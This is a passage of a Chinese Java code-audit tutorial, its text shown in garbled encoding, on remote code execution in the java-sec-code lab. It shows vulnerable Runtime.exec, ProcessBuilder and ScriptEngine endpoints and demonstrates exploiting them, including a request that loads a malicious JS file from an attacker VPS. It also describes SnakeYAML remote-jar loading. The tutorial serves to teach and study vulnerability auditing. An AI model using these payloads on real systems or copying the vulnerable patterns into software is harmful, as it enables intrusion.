      <link href="/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="RCE-ç®€è¿°"><a href="#RCE-ç®€è¿°" class="headerlink" title="RCE ç®€è¿°"></a>RCE ç®€è¿°</h2><p>RCE (Remote Code Execution), è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¿™é‡ŒåŒ…å«ä¸¤ç§ç±»å‹æ¼æ´:<code>å‘½ä»¤æ³¨å…¥ï¼ˆCommand Injectionï¼‰</code>ï¼Œåœ¨æŸç§å¼€å‘éœ€æ±‚ä¸­ï¼Œéœ€è¦å¼•å…¥å¯¹ç³»ç»Ÿæœ¬åœ°å‘½ä»¤çš„æ”¯æŒæ¥å®Œæˆç‰¹å®šåŠŸèƒ½ï¼Œå½“æœªå¯¹è¾“å…¥åšè¿‡æ»¤æ—¶ï¼Œåˆ™ä¼šäº§ç”Ÿå‘½ä»¤æ³¨å…¥ã€‚<code>ä»£ç æ³¨å…¥ï¼ˆCode Injectionï¼‰</code>ï¼Œåœ¨æ­£å¸¸çš„javaç¨‹åºä¸­æ³¨å…¥ä¸€æ®µjavaä»£ç å¹¶æ‰§è¡Œï¼Œå³ç”¨æˆ·è¾“å…¥çš„æ•°æ®å½“ä½œjavaä»£ç è¿›è¡Œæ‰§è¡Œã€‚</p><h2 id="Java-å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#Java-å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="Java å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>Java å‘½ä»¤æ‰§è¡Œå‡½æ•°</h2><p>Java å‘½ä»¤æ‰§è¡Œå‡½æ•°ç›¸å¯¹ PHP æ¥è¯´ï¼Œèƒ½å¤Ÿè¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°å¹¶ä¸å¤šï¼Œåªæœ‰ä¸¤ä¸ª <code>Runtime</code> ,<code>ProcessBuilder</code>ï¼Œå…¶ä»–æ–¹æ³•ä¹Ÿèƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæœ¬æ–‡ä¸»è¦ä»‹ç»å¦‚ä¸‹ï¼š</p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>| å‡½æ•°/å…¶ä»–              | ä½œç”¨                                             || --------------------- | --------------------------------------------     || Runtime               | å‘½ä»¤æ‰§è¡Œ                                          || ProcessBuilder        | å‘½ä»¤æ‰§è¡Œ                                          || ScriptEbgineï¼ˆJScmdï¼‰ | åŠ è½½è¿œç¨‹ js æ–‡ä»¶æ¥æ‰§è¡Œå‘½ä»¤                          || yml                   | åˆ©ç”¨ SnakeYAML å°† yaml æ–‡ä»¶è§£æ ymlï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ   || groovy                | ä¸å®‰å…¨ä½¿ç”¨ groovy å¯¼è‡´å‘½ä»¤æ‰§è¡Œ                     |</pre></td></tr></tbody></table></figure><br/><h2 id="é¶åœºæ­å»º"><a href="#é¶åœºæ­å»º" class="headerlink" title="é¶åœºæ­å»º"></a>é¶åœºæ­å»º</h2><h3 id="ä¸€ã€é¡¹ç›®åœ°å€"><a href="#ä¸€ã€é¡¹ç›®åœ°å€" class="headerlink" title="ä¸€ã€é¡¹ç›®åœ°å€"></a>ä¸€ã€é¡¹ç›®åœ°å€</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/JoyChou93/java-sec-code</span><br></pre></td></tr></table></figure></div><br/><h3 id="äºŒã€ç¯å¢ƒé…ç½®"><a href="#äºŒã€ç¯å¢ƒé…ç½®" class="headerlink" title="äºŒã€ç¯å¢ƒé…ç½®"></a>äºŒã€ç¯å¢ƒé…ç½®</h3><p>1ã€å¯¼å…¥æºç ä¸­çš„ sql æ–‡ä»¶è‡³ Mysql æ•°æ®åº“ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924211209757.png" data-caption="image-20220924211209757"><img src="/../images/Java/rce/image-20220924211209757.png" alt="image-20220924211209757"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924211301830.png" data-caption="image-20220924211301830"><img src="/../images/Java/rce/image-20220924211301830.png" alt="image-20220924211301830"></a></p><p>2ã€ä¿®æ”¹æºç æ•°æ®åº“ root å¯†ç </p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924210314888.png" data-caption="image-20220924210314888"><img src="/../images/Java/rce/image-20220924210314888.png" alt="image-20220924210314888"></a></p><p>3ã€ç¼–è¯‘é¡¹ç›®</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220915164044238-16640246936051.png" data-caption="image-20220915164044238"><img src="/../images/Java/rce/image-20220915164044238-16640246936051.png" alt="image-20220915164044238"></a></p><p>å³é”®runï¼ŒæˆåŠŸå¯åŠ¨é¡¹ç›®</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220915164142524.png" data-caption="image-20220915164142524"><img src="/../images/Java/rce/image-20220915164142524.png" alt="image-20220915164142524"></a></p><p>æˆåŠŸæ­å»ºï¼Œè´¦å·å¯†ç ï¼šadmin&#x2F;admin123ã€joychou&#x2F;joychou123</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220915164229589.png" data-caption="image-20220915164229589"><img src="/../images/Java/rce/image-20220915164229589.png" alt="image-20220915164229589"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220915164400359.png" data-caption="image-20220915164400359"><img src="/../images/Java/rce/image-20220915164400359.png" alt="image-20220915164400359"></a></p><p>è‹¥å‰æœŸç¯å¢ƒæ²¡æœ‰æ­å»ºï¼Œè¯·å‚è€ƒä¸Šä¸€ç¯‡æ–‡ç« ã€‚</p><h2 id="æ¼æ´å­¦ä¹ "><a href="#æ¼æ´å­¦ä¹ " class="headerlink" title="æ¼æ´å­¦ä¹ "></a>æ¼æ´å­¦ä¹ </h2><h3 id="ä¸€ã€Runtime-å‘½ä»¤æ‰§è¡Œ"><a href="#ä¸€ã€Runtime-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ä¸€ã€Runtime å‘½ä»¤æ‰§è¡Œ"></a>ä¸€ã€Runtime å‘½ä»¤æ‰§è¡Œ</h3><p>Runtime ç±»å°è£…äº†è¿è¡Œæ—¶çš„ç¯å¢ƒï¼Œæ¯ä¸ª Java åº”ç”¨ç¨‹åºéƒ½æœ‰ä¸€ä¸ª Runtime ç±»å®ä¾‹ï¼Œä½¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿä¸å…¶è¿è¡Œçš„ç¯å¢ƒç›¸è¿æ¥ã€‚ä¸€èˆ¬ä¸èƒ½å®ä¾‹åŒ–ä¸€ä¸ª Runtime å¯¹è±¡ï¼Œåº”ç”¨ç¨‹åºä¹Ÿä¸èƒ½åˆ›å»ºè‡ªå·±çš„ Runtime ç±»å®ä¾‹ï¼Œä½†å¯ä»¥é€šè¿‡ getRuntime æ–¹æ³•è·å–å½“å‰ Runtime è¿è¡Œæ—¶å¯¹è±¡çš„å¼•ç”¨ã€‚å½“ Runtime çš„å¯¹è±¡è¢«å¼•ç”¨ï¼Œå°±å¯ä»¥è°ƒç”¨ Runtime å¯¹è±¡çš„æ–¹æ³•å»æ§åˆ¶ Java è™šæ‹Ÿæœºçš„çŠ¶æ€å’Œè¡Œä¸ºã€‚ </p><p>æ¼æ´åˆ†æï¼Œå…·ä½“æ¼æ´ä»£ç å¦‚ä¸‹:</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/rce&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rce</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/runtime/exec&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">CommandExec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">run</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> run.exec(cmd);</span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                sb.append(tmpStr);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p.waitFor() != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (p.exitValue() == <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Command exec failed!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            inBr.close();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>IDEAè°ƒè¯•åˆ†æï¼Œå®šä½æ¼æ´ä»£ç ï¼Œåˆ©ç”¨IDEAå…¨å±€æœç´¢ï¼Œå®šä½å±é™©å‡½æ•° <code>å³é”®ç›®å½• -ã€‹ Find in files</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918141941315.png" data-caption="image-20220918141941315"><img src="/../images/Java/rce/image-20220918141941315.png" alt="image-20220918141941315"></a></p><p>æœç´¢ <code>runtime</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918142058897.png" data-caption="image-20220918142058897"><img src="/../images/Java/rce/image-20220918142058897.png" alt="image-20220918142058897"></a></p><p>å½“å¤šå¤„å­˜åœ¨åˆ™éœ€è¦è¿›ä¸€æ­¥åˆ†æ,å®šä½åˆ° <code>runtime</code> å±é™©å‡½æ•°æ–‡ä»¶ä¸º <code>Rce.java</code> , åˆæ­¥åˆ†æå…¶ä»£ç ï¼Œæ²¡æœ‰å‘ç°è¿›è¡Œè¿‡æ»¤å¤„ç†</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918142354828.png" data-caption="image-20220918142354828"><img src="/../images/Java/rce/image-20220918142354828.png" alt="image-20220918142354828"></a></p><p>è·Ÿè¿› <code>getRuntime()</code> æ–¹æ³•ï¼Œ<code>Ctrl + é¼ æ ‡å·¦é”®</code> ç‚¹å‡» <code>getRuntime</code>ï¼Œ ä»£ç æ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥è¿”å› <code>currentRuntime</code> å¯¹è±¡ï¼Œ ç”±ä¸‹å›¾å¯çŸ¥ï¼Œ<code>currentRuntime</code> ä¸ºç±» <code>Runtime</code> çš„å®ä¾‹å¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯æ¬¡è°ƒç”¨ <code>getRuntime()</code> æ–¹æ³•éƒ½ä¼šç”±ç±» <code>Runtime</code> äº§ç”Ÿä¸€ä¸ªæ–°çš„å®ä¾‹å¯¹è±¡ <code>new Runtime()</code>ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918142639287.png" data-caption="image-20220918142639287"><img src="/../images/Java/rce/image-20220918142639287.png" alt="image-20220918142639287"></a></p><p>ä»£ç å³å¯åˆ†æä¸º,å½“è°ƒç”¨äº† <code>getRuntime()</code> äº§ç”Ÿäº†ä¸€ä¸ªæ–°çš„ <code>Runtime</code> å¯¹è±¡åï¼Œå†è¿›è¡Œä¸‹ä¸€æ­¥æ‰§è¡Œ <code>run.exec()</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918143346281.png" data-caption="image-20220918143346281"><img src="/../images/Java/rce/image-20220918143346281.png" alt="image-20220918143346281"></a></p><p>è·Ÿè¿› <code>exec</code> æ–¹æ³•ï¼Œ <code>Ctrl + é¼ æ ‡å·¦é”®</code>ç‚¹å‡» <code>exec</code> ,é€šè¿‡å®ä¾‹åŒ–äº† <code>Runtime.getRuntime()</code> ,åˆ©ç”¨ <code>exec</code> å»æ‰§è¡Œä¼ å…¥çš„å‚æ•°ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918144021479.png" data-caption="image-20220918144021479"><img src="/../images/Java/rce/image-20220918144021479.png" alt="image-20220918144021479"></a></p><p>æ¼æ´å¤ç°ï¼Œå®šä½æ¼æ´è·¯å¾„ï¼ŒæŒ‰è‡ªä¸Šåˆ°ä¸‹çš„æ–¹æ³•åˆæ­¥å®šä½è·¯å¾„ <code>/rce/runtime/exec?cmd</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918144306263.png" data-caption="image-20220918144306263"><img src="/../images/Java/rce/image-20220918144306263.png" alt="image-20220918144306263"></a></p><p>æˆåŠŸå¤ç°</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918144431283.png" data-caption="image-20220918144431283"><img src="/../images/Java/rce/image-20220918144431283.png" alt="image-20220918144431283"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918144521945.png" data-caption="image-20220918144521945"><img src="/../images/Java/rce/image-20220918144521945.png" alt="image-20220918144521945"></a></p><p>å°ç»“ï¼šé€šè¿‡å…¨å±€æœç´¢ Runtime ,å®šä½æ˜¯å¦å­˜åœ¨å±é™©å‡½æ•°ï¼Œç„¶åæŸ¥çœ‹å…¶ä»£ç æ˜¯å¦é‡‡å–äº†è¿‡æ»¤æœºåˆ¶ï¼Œå†è·Ÿè¿›ä»£ç åˆ†æå…¶æ‰§è¡Œæ–¹æ³•ï¼Œæœ€åå®šä½æ¼æ´è·¯å¾„è¿›è¡Œæ¼æ´å¤ç°ã€‚</p><br/><h3 id="äºŒã€ProcessBuilder-å‘½ä»¤æ‰§è¡Œ"><a href="#äºŒã€ProcessBuilder-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="äºŒã€ProcessBuilder å‘½ä»¤æ‰§è¡Œ"></a>äºŒã€ProcessBuilder å‘½ä»¤æ‰§è¡Œ</h3><p><code>ProcessBuilder</code> ç±»é€šè¿‡åˆ›å»ºç³»ç»Ÿè¿›ç¨‹æ‰§è¡Œå‘½ä»¤,æ¯ä¸ª <code>ProcessBuilder</code> å®ä¾‹ç®¡ç†ä¸€ä¸ªè¿›ç¨‹çš„å±æ€§ï¼Œ<code>start()</code> æ–¹æ³•ä½¿ç”¨è¿™äº›å±æ€§åˆ›å»ºä¸€ä¸ªæ–°çš„ <code>Process</code> å®ä¾‹ã€‚å¯ä»¥ä»åŒä¸€å®ä¾‹é‡å¤è°ƒç”¨<code>start()</code> æ–¹æ³•ä»¥åˆ›å»ºå…·æœ‰ç›¸åŒæˆ–ç›¸å…³å±æ€§çš„æ–°å­è¿›ç¨‹ã€‚</p><p>æ¼æ´åˆ†æï¼Œå…·ä½“æ¼æ´ä»£ç å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/ProcessBuilder&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">processBuilder</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// String[] arrCmd = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;; //Linux</span></span><br><span class="line">        String[] arrCmd = &#123;cmd&#125;;  <span class="comment">//Windows</span></span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(arrCmd);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        String tmpStr;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            sb.append(tmpStr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æ ¸å¿ƒä»£ç , åˆ›å»º <code>ProcessBuilder</code> å®ä¾‹åŒ–å¯¹è±¡ï¼Œè°ƒç”¨ <code>start</code> æ–¹æ³•æ‰§è¡Œ <code>arrCmd</code> </p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(arrCmd);</span><br><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> processBuilder.start();</span><br></pre></td></tr></table></figure></div><p>è¿”å› <code>Process</code> å¯¹è±¡ <code>p </code> è°ƒç”¨ <code>getInputStream</code> è·å–è¾“å…¥æµï¼Œè¯»å–è¾“å…¥æµå†™å…¥è¾“å…¥æµã€‚</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br></pre></td></tr></table></figure></div><p>æ¼æ´è·¯å¾„æ‰¾å¯»ï¼Œä¾æ—§æŒ‰ç…§ä»ä¸Šè€Œä¸‹çš„æ–¹æ³•æ‰¾å¯»è·¯å¾„</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220923103044841.png" data-caption="image-20220923103044841"><img src="/../images/Java/rce/image-20220923103044841.png" alt="image-20220923103044841"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220923103020225.png" data-caption="image-20220923103020225"><img src="/../images/Java/rce/image-20220923103020225.png" alt="image-20220923103020225"></a></p><p>æ‹¼æ¥è·¯å¾„ï¼Œæ¼æ´å¤ç° <code>http://192.168.114.131:8080/rce/ProcessBuilder?cmd=calc.exe</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220923101155900.png" data-caption="image-20220923101155900"><img src="/../images/Java/rce/image-20220923101155900.png" alt="image-20220923101155900"></a></p><p>å°ç»“ï¼šå‚è€ƒç¬¬ä¸€éƒ¨åˆ†æ–¹æ³•ï¼Œé€šè¿‡å…¨å±€æœç´¢ <code>ProcessBuilder</code> å®šä½æ˜¯å¦å­˜åœ¨å±é™©å‡½æ•°ï¼Œç„¶åæŸ¥çœ‹å…¶ä»£ç æ˜¯å¦é‡‡å–äº†è¿‡æ»¤æœºåˆ¶ï¼Œå†è·Ÿè¿›ä»£ç åˆ†æå…¶æ‰§è¡Œæ–¹æ³•ï¼Œæœ€åå®šä½æ¼æ´è·¯å¾„è¿›è¡Œæ¼æ´å¤ç°ã€‚</p><br/><h3 id="ä¸‰ã€ScriptEngine-å‘½ä»¤æ‰§è¡Œ-jscmd"><a href="#ä¸‰ã€ScriptEngine-å‘½ä»¤æ‰§è¡Œ-jscmd" class="headerlink" title="ä¸‰ã€ScriptEngine å‘½ä»¤æ‰§è¡Œ(jscmd)"></a>ä¸‰ã€ScriptEngine å‘½ä»¤æ‰§è¡Œ(jscmd)</h3><p><code>ScriptEngine</code> æ˜¯ä¸€ä¸ªè„šæœ¬å¼•æ“ï¼ŒåŒ…å«ä¸€äº›æ“ä½œæ–¹æ³•ï¼Œ<code>eval</code> ,<code>createBindings</code>, <code>setBindings</code>ã€‚é€šè¿‡ <code>ScriptEngine</code> è·å– <code>jsurl</code> ä¼ å…¥çš„ <code>js</code> è„šæœ¬æ–‡ä»¶ï¼Œç„¶åå†é€šè¿‡ <code>engine.getBindings</code> è·å– <code>js</code> è„šæœ¬æ–‡ä»¶ä¸­çš„æ–¹æ³•å’Œå±æ€§ï¼ŒåŠ è½½ <code>js</code> ä¹‹åå°†å…¶èµ‹å€¼ç»™ <code>cmd</code>ï¼Œç„¶åå†é€šè¿‡ <code>engine.eval</code> æ‰§è¡Œï¼Œâš ï¸ åœ¨ <code>Java 8</code>ä¹‹åç§»é™¤äº† <code>ScriptEngineManager</code> çš„ <code>eval</code>ã€‚</p><p>å…·ä½“æ¼æ´æºç å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/jscmd&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">jsEngine</span><span class="params">(String jsurl)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="comment">// js nashorn javascript ecmascript</span></span><br><span class="line">    <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line">    <span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> String.format(<span class="string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);</span><br><span class="line">    engine.eval(cmd, bindings);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æ¶æ„jsä»£ç ï¼Œæ”¾ç½®äºVPSä¸­ï¼Œå¾…è¿œç¨‹è°ƒç”¨</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="title function_">mainOutput</span>(); </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">mainOutput</span>(<span class="params"></span>) &#123; </span><br><span class="line">    <span class="keyword">var</span> x=java.<span class="property">lang</span>.<span class="property">Runtime</span>.<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æ¼æ´å¤ç°ï¼Œvpsä¸Šæ”¾ç½®æ¶æ„ä»£ç </p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924200159394.png" data-caption="image-20220924200159394"><img src="/../images/Java/rce/image-20220924200159394.png" alt="image-20220924200159394"></a></p><p>è¿œç¨‹è®¿é—®åŠ è½½æ¶æ„ js å®ç°æ”»å‡»,æ„é€ é“¾æ¥ä¸ºï¼š<code>http://127.0.0.1:8080/jscmd?jsurl=http://x.x.x.x:8000/test.js</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924200052768.png" data-caption="image-20220924200052768"><img src="/../images/Java/rce/image-20220924200052768.png" alt="image-20220924200052768"></a></p><p>å°ç»“ï¼šé€šè¿‡å…¨å±€æœç´¢ <code>ScriptEngine</code> å®šä½æ˜¯å¦å­˜åœ¨å±é™©å‡½æ•°ï¼Œç„¶åæŸ¥çœ‹å…¶ä»£ç æ˜¯å¦é‡‡å–äº†è¿‡æ»¤æœºåˆ¶ï¼Œå†è·Ÿè¿›ä»£ç åˆ†æå…¶æ‰§è¡Œæ–¹æ³•ï¼Œæœ€åå®šä½æ¼æ´è·¯å¾„è¿›è¡Œæ¼æ´å¤ç°ã€‚</p><br/><h3 id="å››ã€ymlå‘½ä»¤æ‰§è¡Œ"><a href="#å››ã€ymlå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å››ã€ymlå‘½ä»¤æ‰§è¡Œ"></a>å››ã€ymlå‘½ä»¤æ‰§è¡Œ</h3><p>YAML(YAML Ainâ€™t Markup Language)ï¼Œä¹Ÿå¯ä»¥å«åšYMLï¼Œæ˜¯ä¸€ç§äººæ€§åŒ–çš„æ•°æ®åºåˆ—åŒ–çš„è¯­è¨€ï¼Œç±»ä¼¼äºXMLï¼ŒJSONã€‚SpringBootçš„é…ç½®æ–‡ä»¶å°±æ”¯æŒyamlæ–‡ä»¶ã€‚åŸç†åˆ©ç”¨ <code>SnakeYAML</code> å­˜åœ¨çš„ååºåˆ—åŒ–æ¼æ´è¿›è¡Œ <code>RCE</code>ï¼Œç³»ç»Ÿåœ¨è§£ææ¶æ„ <code>yml</code> å†…å®¹æ—¶ä¼šå®ŒæˆæŒ‡å®šçš„åŠ¨ä½œã€‚è§¦å‘ <code>java.net.URL</code> å»æ‹‰å–è¿œç¨‹ <code>HTTP</code> æœåŠ¡å™¨ä¸Šçš„æ¶æ„ <code>jar</code> æ–‡ä»¶,ç„¶åæ˜¯å¯»æ‰¾ <code>jar</code> æ–‡ä»¶ä¸­å®ç° <code>javax.script.ScriptEngineFactory</code> æ¥å£çš„ç±»å¹¶å®ä¾‹åŒ–ï¼Œå®ä¾‹åŒ–ç±»æ—¶æ‰§è¡Œæ¶æ„ä»£ç ï¼Œé€ æˆ RCE æ¼æ´ã€‚</p><p>yamlæœ‰ä¸‰ç§æ•°æ®ç»“æ„ï¼Œç»“æ„å¦‚ä¸‹ï¼š</p><p>â— å¯¹è±¡</p><div class="highlight-wrap" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 